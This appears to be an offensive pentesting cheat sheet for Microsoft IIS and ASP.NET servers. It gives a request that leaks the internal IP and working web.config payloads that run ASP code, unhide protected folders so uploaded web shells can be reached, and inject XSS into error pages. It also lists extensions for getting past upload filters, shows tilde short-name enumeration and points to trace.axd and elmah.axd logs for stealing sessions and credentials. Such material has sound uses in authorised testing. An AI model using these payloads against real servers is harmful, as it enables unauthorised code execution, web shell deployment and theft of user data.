## 1) Internal IP Address disclosure

On any IIS server where you get a 302 you can try stripping the Host header and using HTTP/1.0 and inside the response the Location header could point you to the internal IP address:

Response disclosing the internal IP:

```
GET / HTTP/1.0       

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016

```

## 2) Running web.config as an ASP file

Sometimes IIS supports ASP files but it is not possible to upload any file with .ASP extension. In this case, it is possible to use a web.config file directly to run ASP classic codes:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```
The web.config file plays an important role in storing IIS7 (and higher) settings. It is very similar to a .htaccess file in Apache web server. Uploading a .htaccess file to bypass protections around the uploaded files is a known technique. Some interesting examples of this technique are accessible via the following GitHub repository: https://github.com/wireghoul/htshells

In IIS7 (and higher), it is possible to do similar tricks by uploading or making a web.config file. A few of these tricks might even be applicable to IIS6 with some minor changes. The techniques below show some different web.config files that can be used to bypass protections around the file uploaders.

### Defaults extensions

* PHP Server
    ```powershell
    .php
    .php3
    .php4
    .php5
    .php7

    # Less known PHP extensions
    .pht
    .phps
    .phar
    .phpt
    .pgif
    .phtml
    .phtm
    .inc
    ```
* ASP Server
    ```powershell
    .asp
    .aspx
    .config
    .cer and .asa # (IIS <= 7.5)
    shell.aspx;1.jpg # (IIS < 7.0)
    shell.soap
    ```
* JSP : `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action`s
* Perl: `.pl, .pm, .cgi, .lib`
* Coldfusion: `.cfm, .cfml, .cfc, .dbm`

Removing protections of hidden segments
Sometimes file uploaders rely on Hidden Segments of IIS Request Filtering such as APP_Data or App_GlobalResources directories to make the uploaded files inaccessible directly.

However, this method can be bypassed by removing the hidden segments by using the following web.config file:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <security>
            <requestFiltering>
                <hiddenSegments>
                    <remove segment="bin" />
                    <remove segment="App_code" />
                    <remove segment="App_GlobalResources" />
                    <remove segment="App_LocalResources" />
                    <remove segment="App_Browsers" />
                    <remove segment="App_WebReferences" />
                    <remove segment="App_Data" />
                    <!--Other IIS hidden segments can be listed here to remove -->
                </hiddenSegments>
            </requestFiltering>
        </security>
    </system.webServer>
</configuration>
```
Now, an uploaded web shell file can be directly accessible.

Creating XSS vulnerability in IIS default error page
Often attackers want to make a website vulnerable to cross-site scripting by abusing the file upload feature.

The handler name of IIS default error page is vulnerable to cross-site scripting which can be exploited by uploading a web.config file that contains an invalid handler name (does not work in IIS 6 or below):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers>
         <!-- XSS by using *.config -->
         <add name="web_config_xss&lt;script&gt;alert('xss1')&lt;/script&gt;" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="fooo" resourceType="Unspecified" requireAccess="None" preCondition="bitness64" />
         <!-- XSS by using *.test -->
         <add name="test_xss&lt;script&gt;alert('xss2')&lt;/script&gt;" path="*.test" verb="*"  />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   <httpErrors existingResponse="Replace" errorMode="Detailed" />
   </system.webServer>
</configuration>
```

Rewriting or creating the web.config file can lead to a major security flaw. In addition to the above scenarios, different web.config files can be used in different situations. I have listed some other examples below (a relevant web.config syntax can be easily found by searching in Google):


* Re-enabling .Net extensions: When .Net extensions such as .ASPX are blocked in the upload folder.
* Using an allowed extension to run as another extension: When ASP, PHP, or other extensions are installed on the server but they are not allowed in the upload directory.
* Abusing error pages or URL rewrite rules to redirect users or deface the website: When the uploaded files such as PDF or JavaScript files are in use directly by the users.
* Manipulating MIME types of uploaded files: When it is not possible to upload a HTML file (or other sensitive client-side files) or when IIS MIME types table is restricted to certain extensions.

## 3) Microsoft IIS tilde character Vulnerability

You can try to enumerate folders and files inside every discovered folder (even if it's requiring Basic Authentication) using this technique.
The main limitation of this technique if the server is vulnerable is that it can only find up to the first 6 letters of the name of each file/folder and the first 3 letters of the extension of the files.
You can use https://github.com/irsdl/IIS-ShortName-Scanner to test for this vulnerability

## 4) ASP.NET Trace.AXD enabled debugging

ASP.NET include a debugging mode and its file is called trace.axd.
It keeps a very detailed log of all requests made to an application over a period of time.
This information includes remote client IP's, session IDs, all request and response cookies, physical paths, source code information, and potentially even usernames and passwords.

![image](https://user-images.githubusercontent.com/63053441/202226272-ed035d88-ff8d-4495-8108-bf7fdb7dda81.png)


If you find an SSRF vulnerability in an ASP application, try reading trace.axd file. It contains logs of HTTP requests, you can find sensitive information in there.

* https://hackerone.com/reports/519418

Other potential paths:
* Elmah.axd
* Errorlog.axd
  
ELMAH (Error Logging Modules and Handlers) is an application-wide error logging facility that is completely pluggable. It can be dynamically added to a running ASP.NET web application, or even all ASP.NET web applications on a machine, without any need for re-compilation or re-deployment. If ELMAH is not properly configured, the elmah.axd handler can be accessed without authorization. This page will list all the error messages generated by the web application and may disclose sensitive information to an attacker.


## Refrences:
* https://book.hacktricks.xyz/
* https://github.com/swisskyrepo/PayloadsAllTheThings
